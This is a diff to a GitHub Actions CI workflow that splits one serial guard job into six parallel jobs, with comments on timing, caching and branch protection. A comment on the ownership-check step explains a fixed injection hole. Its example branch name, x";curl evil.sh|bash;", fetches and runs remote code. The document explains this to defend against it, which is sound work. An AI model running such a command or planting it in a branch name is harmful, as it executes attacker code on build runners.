@@ -39,8 +39,42 @@ concurrency:
   group: guards-${{ github.ref }}
   cancel-in-progress: true
 
+# SIX JOBS RATHER THAN ONE, AND THE REASON IS MEASURED RATHER THAN FELT.
+#
+# This was a single serial job and took 14 minutes 11 seconds on the run that prompted the
+# change. Timed step by step off that run, SIX STEPS WERE NINETY PERCENT OF THE WALL CLOCK and
+# the other eighty five finished in about thirty seconds between them.
+#
+#   201s  Site build self-test
+#   ~195s The page actually renders as night, and the two layout sweeps beside it
+#   101s  Freshness gate self-test
+#    74s  The build reads the ledgers and nothing about the clone
+#    35s  The published site is exactly what the ledgers produce
+#
+# Nothing in that list waits on anything else in it. They were serial because they were written
+# in one list, which is a property of the file rather than of the checks. Split across jobs the
+# wall clock is the longest single job instead of the sum, which is about three and a half
+# minutes for the same work and the same coverage.
+#
+# WHAT WAS NOT DONE, AND WHY. The obvious next idea is to build the site once and hand the
+# result to the jobs that need it. That is wrong here. `Site build self-test`, `Freshness gate
+# self-test` and `The published site is exactly what the ledgers produce` are each TESTING THE
+# BUILD, so handing them a build somebody else did removes the thing they check. The browser
+# jobs need no build at all, because `docs/` is committed and they read it straight from the
+# checkout.
+#
+# THE COST IS RUNNER MINUTES, NOT COVERAGE. Six checkouts and three pip installs instead of one
+# of each, plus the browser install in each of the three browser jobs, which the cache makes
+# cheap. Total machine time goes up slightly. The number a person waits on goes down four fold.
+#
+# NOTHING WAS DROPPED IN THE SPLIT. Every `run:` step from the single-job version is present,
+# verbatim, with the comment block that documents it. The only additions are the aggregate job
+# at the foot of the file and the shape check that keeps it honest.
+
 jobs:
-  guards:
+
+  gates:
+    # Every gate that needs neither a browser nor a full site build.
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -65,6 +99,25 @@ jobs:
       - name: Port audit self-test (prove every gate can go red)
         run: python3 scripts/shared/port_audit.py --self-test
 
+      # THE WORKFLOW'S OWN WIRING. This file is six jobs behind one required check now, and a
+      # job nobody waits on is a gate connected to nothing. Self-tests first, same rule as the
+      # two above.
+      - name: Guard workflow shape self-test (prove it can go red)
+        run: python3 scripts/shared/guards_shape.py --self-test
+
+      - name: Every guard job is behind the required check
+        run: python3 scripts/shared/guards_shape.py
+
+      # THE ROUTINE'S OWN CLAIMS ABOUT PUBLISHED COPY. An unattended run reads
+      # prompts/daily_routine.md to know what to do, and part of that file describes what the
+      # pages say. A description that has gone stale is not wrong about a fact, it is wrong
+      # about an INTENTION, and the run acts on it. Self-test first, same rule as the rest.
+      - name: Routine claims self-test (prove it can go red)
+        run: python3 scripts/shared/routine_claims.py --self-test
+
+      - name: The routine describes the site it actually publishes
+        run: python3 scripts/shared/routine_claims.py
+
       - name: Places self-test (the canonical place record and its resolver)
         run: python3 scripts/shared/places.py --self-test
 
@@ -78,6 +131,24 @@ jobs:
           diff -q /tmp/tx-places.committed.json assets/geo/tx-places.json \
             || { echo "tx-places.json is not reproducible from tx-counties.topo.json"; exit 1; }
           echo "places record reproduces byte-for-byte"
+
+      - name: Reservoir positions self-test (the pins the water map is drawn from)
+        run: python3 scripts/shared/reservoirs.py --self-test
+
+      - name: Reservoir positions agree with the archive they came from
+        run: |
+          # Same discipline as the place record above, with one difference stated in the
+          # script: this rebuilds by UNION rather than from zero, because its source is a
+          # directory of dated snapshots and a snapshot directory eventually gets thinned. A
+          # build that replaced would then drop pins for a reason that has nothing to do with
+          # water. So the property checked is IDEMPOTENCE. Rebuild, and require that nothing
+          # moved. A gauge does not move, so a coordinate that disagrees is an error rather
+          # than an update, and the build refuses it rather than picking a side.
+          cp assets/geo/tx-reservoirs.json /tmp/tx-reservoirs.committed.json
+          python3 scripts/shared/reservoirs.py build
+          diff -q /tmp/tx-reservoirs.committed.json assets/geo/tx-reservoirs.json \
+            || { echo "tx-reservoirs.json disagrees with ledger/gridwatch/raw"; exit 1; }
+          echo "reservoir positions reproduce byte-for-byte"
 
       - name: Docket gates self-test (prove every gate can go red)
         run: python3 scripts/site/docket_build.py --self-test
@@ -562,8 +633,129 @@ jobs:
           # none, because it invites somebody to measure with it.
           python3 scripts/site/texas_map.py --self-test
 
+      # A LANE IS SCOPED TO A COMMIT, NOT TO A BRANCH.
+      # This step used to pin one actor from the branch prefix and check the whole branch diff,
+      # which disagreed with the pre-commit hook, which reads a per-commit stamp. The daily
+      # routine's Phase 17 stamps `upgrade` and commits on a `claude/daily-` branch, so obeying
+      # the routine produced a branch this step was built to reject. It now walks the range one
+      # commit at a time and reads each commit's `Actor:` trailer, written by
+      # .githooks/commit-msg from the same stamp the hook reads. `branch_also_allows` in
+      # ownership.yaml bounds which lanes a prefix may stamp.
+      - name: Ownership check
+        # THE BRANCH NAME IS ATTACKER CONTROLLED AND IT USED TO BE PASTED INTO THIS SHELL.
+        #
+        # `github.head_ref` is the SOURCE BRANCH of a pull request, which on a fork PR is
+        # whatever a stranger typed. `${{ }}` is expanded by the runner into the script text
+        # BEFORE bash parses it, so a branch named `x";curl evil.sh|bash;"` used to become a
+        # command rather than a string. This repo is public, so anybody could open that PR.
+        #
+        # The blast radius was bounded and it was never nothing. A `pull_request` run on a fork
+        # gets a read-only token and no secrets, and this repo keeps no secrets in workflows at
+        # all, so there was nothing to steal. What was reachable is arbitrary code on a runner
+        # billed to this account, and a guards check that reports whatever the attacker wants,
+        # which is how a hostile pull request gets a green tick.
+        #
+        # Passing through `env:` is the fix. The value reaches bash as a variable rather than as
+        # script text, so a branch full of quotes and semicolons is a weird string and nothing
+        # more. Never interpolate `${{ }}` straight into a `run:` block.
+        env:
+          BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+        run: |
+          BRANCH="$BRANCH_NAME"
+          BASE="$BASE_SHA"
+          if [ -n "$BASE" ]; then
+            RANGE="$BASE...HEAD"
+          else
+            git fetch --quiet origin main || true
+            RANGE="origin/main...HEAD"
+          fi
+          echo "branch=$BRANCH range=$RANGE"
+          python3 scripts/shared/ownership_check.py --branch "$BRANCH" --diff-per-commit "$RANGE"
+
+      # The checker's own red cases. Without this the step above could be passing because it
+      # cannot fail, which is the fault this repo has shipped more than once.
+      - name: Ownership checker can go red
+        run: python3 scripts/shared/ownership_check.py --self-test
+
+      - name: Port manifest is current
+        run: |
+          # The manifest is generated from the upstream source repos, which are not checked
+          # out in CI, so regenerating it here is impossible by design. Assert instead that it
+          # parses, carries the expected columns, and that nothing is left UNROUTED.
+          python3 - <<'PY'
+          import csv, sys
+          from pathlib import Path
+          rows = list(csv.DictReader(Path("PORT_MANIFEST.tsv").open(newline="", encoding="utf-8"),
+                                     delimiter="\t"))
+          expected = {"source_repo", "source_path", "bytes", "lines", "ak_hits",
+                      "disposition", "target_path", "status", "reason"}
+          missing_cols = expected - set(rows[0].keys())
+          if missing_cols:
+              sys.exit(f"manifest is missing columns: {sorted(missing_cols)}")
+          bad = [r for r in rows if r["disposition"] == "UNROUTED"]
+          if bad:
+              sys.exit(f"{len(bad)} manifest row(s) still UNROUTED, first: {bad[0]['source_path']}")
+          print(f"manifest ok: {len(rows)} rows, none unrouted")
+          PY
+
+      - name: Port audit
+        run: python3 scripts/shared/port_audit.py
+
+  build:
+    # The site builder, against itself.
+    #
+    # NO `fetch-depth: 0` HERE, DELIBERATELY. The build is a pure function of the ledgers and
+    # nothing else, which is a property this suite proves rather than assumes: `lastmod.py`
+    # derives its dates from the record after GATE_LESSONS 30 caught it reading git, and the
+    # gates job clones this repo at depth 1 and at full depth and diffs the two builds. A
+    # shallow checkout is therefore correct and quicker. The one job that does need full
+    # history is `gates`, because the ownership check diffs against the base and because that
+    # clone comparison needs real history to compare against.
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install dependencies
+        # Pillow and numpy are for ship_images, which measures the encode it produced rather
+        # than asserting a figure. Installed rather than skipped when absent: a self-test that
+        # quietly skips is a self-test that never runs, and the whole point of running these in
+        # CI is that the developer's container is not the thing being checked. This exact gap
+        # shipped green locally and failed here on the first push.
+        run: pip install --quiet pyyaml pillow numpy
+
       - name: Site build self-test
         run: python3 scripts/site/site_build.py --self-test
+
+  freshness:
+    # The published bytes against a fresh build of the same ledgers.
+    #
+    # NO `fetch-depth: 0` HERE, DELIBERATELY. The build is a pure function of the ledgers and
+    # nothing else, which is a property this suite proves rather than assumes: `lastmod.py`
+    # derives its dates from the record after GATE_LESSONS 30 caught it reading git, and the
+    # gates job clones this repo at depth 1 and at full depth and diffs the two builds. A
+    # shallow checkout is therefore correct and quicker. The one job that does need full
+    # history is `gates`, because the ownership check diffs against the base and because that
+    # clone comparison needs real history to compare against.
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install dependencies
+        # Pillow and numpy are for ship_images, which measures the encode it produced rather
+        # than asserting a figure. Installed rather than skipped when absent: a self-test that
+        # quietly skips is a self-test that never runs, and the whole point of running these in
+        # CI is that the developer's container is not the thing being checked. This exact gap
+        # shipped green locally and failed here on the first push.
+        run: pip install --quiet pyyaml pillow numpy
 
       - name: Freshness gate self-test (it bites, and a date change alone does not)
         run: python3 scripts/site/site_fresh_check.py --self-test
@@ -575,13 +767,24 @@ jobs:
           # a stale build. It is the guarantee behind "docs/ is generated, never hand-edited".
           python3 scripts/site/site_fresh_check.py
 
+  browser-read:
+    # The lanes a reader types into.
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
       # THE BROWSER IS INSTALLED ONCE, CACHED, AND ON A CLOCK.
       #
-      # Six later steps need a browser and the first of them used to install it inline. That
+      # The suites below need a browser and the first of them used to install it inline. That
       # put three uncached network operations behind one step name: an unpinned npm install, a
       # browser download, and an apt-get from `--with-deps`. When those hung, the run showed a
       # test in progress for ninety minutes with no output, and the obvious reading of that is
       # "the test is slow", which is the wrong place to go looking. It cost most of a night.
+      #
+      # THIS PAIR APPEARS IN EACH BROWSER JOB, which is not duplication to tidy away. Jobs run
+      # on separate runners with separate filesystems, so a browser installed by one is not a
+      # browser the next can use. The cache key is shared, so the second and third jobs restore
+      # rather than download and the extra cost is a few seconds each.
       #
       # So: pinned and cached, so the usual case touches the network for nothing; separated
       # from the test, so a failure names the install rather than the check; and timed out, so
@@ -654,6 +857,49 @@ jobs:
           # switch latency in the page, and checks 12 widths.
           SITE=docs node tests/docket_calendar.mjs
 
+  browser-render:
+    # What the page actually paints, and how it moves under a thumb.
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # THE BROWSER IS INSTALLED ONCE, CACHED, AND ON A CLOCK.
+      #
+      # The suites below need a browser and the first of them used to install it inline. That
+      # put three uncached network operations behind one step name: an unpinned npm install, a
+      # browser download, and an apt-get from `--with-deps`. When those hung, the run showed a
+      # test in progress for ninety minutes with no output, and the obvious reading of that is
+      # "the test is slow", which is the wrong place to go looking. It cost most of a night.
+      #
+      # THIS PAIR APPEARS IN EACH BROWSER JOB, which is not duplication to tidy away. Jobs run
+      # on separate runners with separate filesystems, so a browser installed by one is not a
+      # browser the next can use. The cache key is shared, so the second and third jobs restore
+      # rather than download and the extra cost is a few seconds each.
+      #
+      # So: pinned and cached, so the usual case touches the network for nothing; separated
+      # from the test, so a failure names the install rather than the check; and timed out, so
+      # a hang becomes a red X in eight minutes instead of an invisible hour.
+      #
+      # `--with-deps` is gone deliberately. It runs apt-get, which is the slowest and most
+      # lock-prone part of the three, and the ubuntu-latest image already carries the shared
+      # libraries chromium needs. If that ever stops being true this fails loudly at launch,
+      # in seconds, which is a better failure than the one it replaces.
+      - name: Cache the browser
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.cache/ms-playwright
+            node_modules
+          key: pw-${{ runner.os }}-${{ env.PLAYWRIGHT_VERSION }}
+
+      - name: Browser for the read-time checks
+        timeout-minutes: 8
+        run: |
+          npm install --no-save --silent "playwright@${PLAYWRIGHT_VERSION}"
+          npx playwright install chromium
+          node -e "require('playwright').chromium.launch().then(b=>b.close()).then(
+            ()=>console.log('chromium launches'), e=>{console.error(e); process.exit(1)})"
+
       - name: The browser is asked what the policy actually refuses
         run: |
           # scripts/site/csp.py audits the policy by PARSING, and it passed on a site it had
@@ -690,6 +936,55 @@ jobs:
           # context would exercise nothing and report green.
           SITE=docs node tests/map_gestures.mjs
 
+      - name: The map helper is oriented correctly
+        run: |
+          # No browser needed: the UMD libraries load under node, which is the point of
+          # testing the projection here rather than only inside a rendered slide.
+          node tests/txgeo.mjs
+
+  browser-layout:
+    # Whether it fits the screen and can be read on it.
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # THE BROWSER IS INSTALLED ONCE, CACHED, AND ON A CLOCK.
+      #
+      # The suites below need a browser and the first of them used to install it inline. That
+      # put three uncached network operations behind one step name: an unpinned npm install, a
+      # browser download, and an apt-get from `--with-deps`. When those hung, the run showed a
+      # test in progress for ninety minutes with no output, and the obvious reading of that is
+      # "the test is slow", which is the wrong place to go looking. It cost most of a night.
+      #
+      # THIS PAIR APPEARS IN EACH BROWSER JOB, which is not duplication to tidy away. Jobs run
+      # on separate runners with separate filesystems, so a browser installed by one is not a
+      # browser the next can use. The cache key is shared, so the second and third jobs restore
+      # rather than download and the extra cost is a few seconds each.
+      #
+      # So: pinned and cached, so the usual case touches the network for nothing; separated
+      # from the test, so a failure names the install rather than the check; and timed out, so
+      # a hang becomes a red X in eight minutes instead of an invisible hour.
+      #
+      # `--with-deps` is gone deliberately. It runs apt-get, which is the slowest and most
+      # lock-prone part of the three, and the ubuntu-latest image already carries the shared
+      # libraries chromium needs. If that ever stops being true this fails loudly at launch,
+      # in seconds, which is a better failure than the one it replaces.
+      - name: Cache the browser
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.cache/ms-playwright
+            node_modules
+          key: pw-${{ runner.os }}-${{ env.PLAYWRIGHT_VERSION }}
+
+      - name: Browser for the read-time checks
+        timeout-minutes: 8
+        run: |
+          npm install --no-save --silent "playwright@${PLAYWRIGHT_VERSION}"
+          npx playwright install chromium
+          node -e "require('playwright').chromium.launch().then(b=>b.close()).then(
+            ()=>console.log('chromium launches'), e=>{console.error(e); process.exit(1)})"
+
       - name: The site fits the screen it is on
         run: |
           # THIS SUITE EXISTED AND DID NOT RUN HERE, which is its own lesson: it caught a real
@@ -710,77 +1005,19 @@ jobs:
           # and measures the glyph against that, over every run of text on every page.
           SITE=docs node tests/text_contrast.mjs
 
-      - name: The map helper is oriented correctly
-        run: |
-          # No browser needed: the UMD libraries load under node, which is the point of
-          # testing the projection here rather than only inside a rendered slide.
-          node tests/txgeo.mjs
-
-      # A LANE IS SCOPED TO A COMMIT, NOT TO A BRANCH.
-      # This step used to pin one actor from the branch prefix and check the whole branch diff,
-      # which disagreed with the pre-commit hook, which reads a per-commit stamp. The daily
-      # routine's Phase 17 stamps `upgrade` and commits on a `claude/daily-` branch, so obeying
-      # the routine produced a branch this step was built to reject. It now walks the range one
-      # commit at a time and reads each commit's `Actor:` trailer, written by
-      # .githooks/commit-msg from the same stamp the hook reads. `branch_also_allows` in
-      # ownership.yaml bounds which lanes a prefix may stamp.
-      - name: Ownership check
-        # THE BRANCH NAME IS ATTACKER CONTROLLED AND IT USED TO BE PASTED INTO THIS SHELL.
-        #
-        # `github.head_ref` is the SOURCE BRANCH of a pull request, which on a fork PR is
-        # whatever a stranger typed. `${{ }}` is expanded by the runner into the script text
-        # BEFORE bash parses it, so a branch named `x";curl evil.sh|bash;"` used to become a
-        # command rather than a string. This repo is public, so anybody could open that PR.
-        #
-        # The blast radius was bounded and it was never nothing. A `pull_request` run on a fork
-        # gets a read-only token and no secrets, and this repo keeps no secrets in workflows at
-        # all, so there was nothing to steal. What was reachable is arbitrary code on a runner
-        # billed to this account, and a guards check that reports whatever the attacker wants,
-        # which is how a hostile pull request gets a green tick.
-        #
-        # Passing through `env:` is the fix. The value reaches bash as a variable rather than as
-        # script text, so a branch full of quotes and semicolons is a weird string and nothing
-        # more. Never interpolate `${{ }}` straight into a `run:` block.
-        env:
-          BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
-          BASE_SHA: ${{ github.event.pull_request.base.sha }}
-        run: |
-          BRANCH="$BRANCH_NAME"
-          BASE="$BASE_SHA"
-          if [ -n "$BASE" ]; then
-            RANGE="$BASE...HEAD"
-          else
-            git fetch --quiet origin main || true
-            RANGE="origin/main...HEAD"
-          fi
-          echo "branch=$BRANCH range=$RANGE"
-          python3 scripts/shared/ownership_check.py --branch "$BRANCH" --diff-per-commit "$RANGE"
-
-      # The checker's own red cases. Without this the step above could be passing because it
-      # cannot fail, which is the fault this repo has shipped more than once.
-      - name: Ownership checker can go red
-        run: python3 scripts/shared/ownership_check.py --self-test
-
-      - name: Port manifest is current
-        run: |
-          # The manifest is generated from the upstream source repos, which are not checked
-          # out in CI, so regenerating it here is impossible by design. Assert instead that it
-          # parses, carries the expected columns, and that nothing is left UNROUTED.
-          python3 - <<'PY'
-          import csv, sys
-          from pathlib import Path
-          rows = list(csv.DictReader(Path("PORT_MANIFEST.tsv").open(newline="", encoding="utf-8"),
-                                     delimiter="\t"))
-          expected = {"source_repo", "source_path", "bytes", "lines", "ak_hits",
-                      "disposition", "target_path", "status", "reason"}
-          missing_cols = expected - set(rows[0].keys())
-          if missing_cols:
-              sys.exit(f"manifest is missing columns: {sorted(missing_cols)}")
-          bad = [r for r in rows if r["disposition"] == "UNROUTED"]
-          if bad:
-              sys.exit(f"{len(bad)} manifest row(s) still UNROUTED, first: {bad[0]['source_path']}")
-          print(f"manifest ok: {len(rows)} rows, none unrouted")
-          PY
-
-      - name: Port audit
-        run: python3 scripts/shared/port_audit.py
+  # THE NAME THE BRANCH PROTECTION KNOWS, kept alive on purpose.
+  #
+  # This workflow was one job called `guards` and is six now. A required status check is
+  # matched by NAME, so splitting it would have quietly removed the check a protected branch
+  # was waiting on, and the first anyone would learn of it is a red merge going in green. This
+  # job carries the old name, does no work, and passes only when every real job has.
+  #
+  # `needs` is the whole mechanism, which makes forgetting to add a new job to it the way this
+  # arrangement fails. So that is checked rather than remembered, by `guards_shape.py` in the
+  # gates job above, which reads this file and refuses a job that nothing waits on.
+  guards:
+    needs: [gates, build, freshness, browser-read, browser-render, browser-layout]
+    runs-on: ubuntu-latest
+    steps:
+      - name: Every guard job passed
+        run: echo "gates, build, freshness and the three browser jobs are green"
